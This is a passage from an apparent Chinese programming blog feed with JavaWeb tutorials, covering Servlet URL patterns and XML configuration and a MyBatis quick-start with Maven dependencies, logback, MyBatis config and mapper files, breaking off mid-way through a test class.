web 项目，都是针对 HTTP 协议，所以我们自定义 Servlet，会继承 HttpServlet</p><ul><li>手写 Servlet 实现方法，这个代码</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//根据请求方式不同进行分别处理</span>    <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>    <span class="token comment">//1.获取请求方式</span>    <span class="token class-name">String</span> method <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//2.判断</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//get方式的处理逻辑</span>        <span class="token function">doget</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//post方式的处理逻辑</span>        <span class="token function">dopost</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-servlet-urlpattern配置"><a class="markdownIt-Anchor" href="#6-servlet-urlpattern配置">#</a> 6、Servlet URLPattern 配置</h1><ul><li>Servlet 想要被访问，必须配置其访问路径 (urlPattern)</li></ul><ol><li>一个 Servlet，可以配置多个 URLPattern<ul><li>@WebServlet(urlPatterns = {&quot;/demo1&quot;, “/demo2”})</li></ul></li><li>URLPattern 配置规则<ul><li>①精确匹配 ②目录匹配 ③扩展名匹配 ④任意匹配</li></ul></li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623111500801.png" alt="image-20220623111500801"></p><h1 id="7-xml配置servlet"><a class="markdownIt-Anchor" href="#7-xml配置servlet">#</a> 7、XML 配置 Servlet</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>demo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.itheima.web.ServletDemo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>demo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/demo13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;快速入门&lt;/li&gt;
&lt;li&gt;Servlet 执行流程&lt;/li&gt;
&lt;li&gt;Servlet 生命周期&lt;/li&gt;
&lt;li&gt;Servlet 体系结构&lt;/li&gt;
&lt;li&gt;Servlet URLPattern 配置&lt;/li&gt;
&lt;li&gt;XML 配置方式编写 Servlet&lt;/</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-MyBatis</title>
    <link href="http://example.com/post/JavaWeb-MyBatis.html"/>
    <id>http://example.com/post/JavaWeb-MyBatis.html</id>
    <published>2022-06-23T13:38:28.000Z</published>
    <updated>2022-06-23T13:42:51.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-mybatis概述"><a class="markdownIt-Anchor" href="#1-mybatis概述">#</a> 1、Mybatis 概述</h1><h2 id="11-mybatis概念"><a class="markdownIt-Anchor" href="#11-mybatis概念">#</a> 1.1  Mybatis 概念</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ul><li><p>MyBatis 是一款优秀的<mark>持久层框架</mark>，用于简化 JDBC 开发</p></li><li><p>MyBatis 本是 Apache 的一个开源项目 iBatis, 2010 年这个项目由 apache software foundation 迁移到了 google code，并且改名为 MyBatis 。2013 年 11 月迁移到 Github</p></li><li><p>官网：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></p></li></ul></blockquote><p><strong>持久层：</strong></p><ul><li><p>负责将数据到保存到数据库的那一层代码。</p><p>以后开发我们会将操作数据库的 Java 代码作为持久层。而 Mybatis 就是对 jdbc 代码进行了封装。</p></li><li><p>JavaEE 三层架构：<mark>表现层、业务层、持久层</mark></p><p>三层架构在后期会给大家进行讲解，今天先简单的了解下即可。</p></li></ul><p><strong>框架：</strong></p><ul><li>框架就是一个半成品软件，是一套可重用的、通用的、软件基础代码模型</li><li>在框架的基础之上构建软件编写更加高效、规范、通用、可扩展</li></ul><p>举例给大家简单的解释一下什么是半成品软件。大家小时候应该在公园见过给石膏娃娃涂鸦</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726202410311.png" alt="image-20210726202410311" style="zoom:70%;" /><p>如下图所示有一个石膏娃娃，这个就是一个半成品。你可以在这个半成品的基础上进行不同颜色的涂鸦</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726202858441.png" alt="image-20210726202858441" style="zoom:70%;" /><p>了解了什么是 Mybatis 后，接下来说说以前  <code>JDBC代码</code>  的缺点以及 Mybatis 又是如何解决的。</p><h2 id="12-jdbc-缺点"><a class="markdownIt-Anchor" href="#12-jdbc-缺点">#</a> 1.2  JDBC 缺点</h2><p>下面是 JDBC 代码，我们通过该代码分析都存在什么缺点：</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726203656847.png" alt="image-20210726203656847" style="zoom:70%;" /><ul><li><p>硬编码</p><ul><li><p>注册驱动、获取连接</p><p>上图标 1 的代码有很多字符串，而这些是连接数据库的四个基本信息，以后如果要将 Mysql 数据库换成其他的关系型数据库的话，这四个地方都需要修改，如果放在此处就意味着要修改我们的源代码。</p></li><li><p>SQL 语句</p><p>上图标 2 的代码。如果表结构发生变化，SQL 语句就要进行更改。这也不方便后期的维护。</p></li></ul></li><li><p>操作繁琐</p><ul><li><p>手动设置参数</p></li><li><p>手动封装结果集</p><p>上图标 4 的代码是对查询到的数据进行封装，而这部分代码是没有什么技术含量，而且特别耗费时间的。</p></li></ul></li></ul><h2 id="13-mybatis-优化"><a class="markdownIt-Anchor" href="#13-mybatis-优化">#</a> 1.3  Mybatis 优化</h2><ul><li>硬编码可以配置到<mark>配置文件</mark></li><li>操作繁琐的地方 mybatis 都<mark>自动完成</mark></li></ul><p>如图所示</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726204849309.png" alt="image-20210726204849309" style="zoom:80%;" /><p>下图是持久层框架的使用占比。</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726205328999.png" alt="image-20210726205328999" style="zoom:80%;" /><h1 id="2-mybatis快速入门"><a class="markdownIt-Anchor" href="#2-mybatis快速入门">#</a> 2、Mybatis 快速入门</h1><h2 id="21-步骤"><a class="markdownIt-Anchor" href="#21-步骤">#</a> 2.1 步骤</h2><ol><li>创建 User 表，添加数据</li><li>创建模块，导入坐标</li><li>编写 mybatis 核心配置文件 -&gt; 替换连接信息，解决硬编码问题</li><li>编写 SQL 映射文件 -&gt; 统一管理 SQL 语句，解决硬编码问题</li><li>编码<ol><li>定义 pojo 类</li><li>加载核心配置文件，获取 SQLSessionFactory 对象</li><li>获取 SQLSession 对象，执行 SQL 语句</li><li>释放资源</li></ol></li></ol><h2 id="22-详细操作"><a class="markdownIt-Anchor" href="#22-详细操作">#</a> 2.2 详细操作</h2><ol><li>在 pom.xml 中导入相关依赖，logback 和 slf4j 都是用来查看日志的，直接复制</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.1.46<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.13<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 添加slf4j日志api --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>slf4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 添加logback-classic依赖 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>ch.qos.logback<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>logback-classic<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 添加logback-core依赖 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>ch.qos.logback<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>logback-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>在 main 的 resources 下创建 logback.xml，内容如下</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--        CONSOLE ：表示当前的日志信息是可以输出到控制台的。    --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">></span></span>[%level] %blue(%d&#123;HH:mm:ss.SSS&#125;) %cyan([%thread]) %boldGreen(%logger&#123;15&#125;) - %msg %n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEBUG<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>logger</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--      level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF     ， 默认debug      &lt;root>可以包含零个或多个&lt;appender-ref>元素，标识这个输出位置将会被本日志级别控制。      --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEBUG<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>在 main 的 resources 下创建 mybatis-config.xml，内容如下</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">configuration</span>        <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Config 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-config.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environments</span> <span class="token attr-name">default</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environment</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transactionManager</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JDBC<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POOLED<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--                数据库配置，自行修改--></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql:///mybatis?useSSL=false<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataSource</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environment</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environments</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mappers</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UserMapper.xml<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mappers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>在 main 的 resources 下创建 UserMapper.xml，Mapper 为映射文件，命名规则为<mark>表名 Mapper.xml</mark>，namespace 为名称空间，id 为<mark>唯一标识 sql 语句的符号</mark>，在执行 SQL 语句时需要使用；resultType 为查询结果要放的类</li></ol><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span>        <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--    namespace：标签空间--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from tb_user;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>测试编码</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">User</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Resources</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSession</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>session<span class="token punctuation">.</span></span><span class="token class-name">SqlSessionFactoryBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> 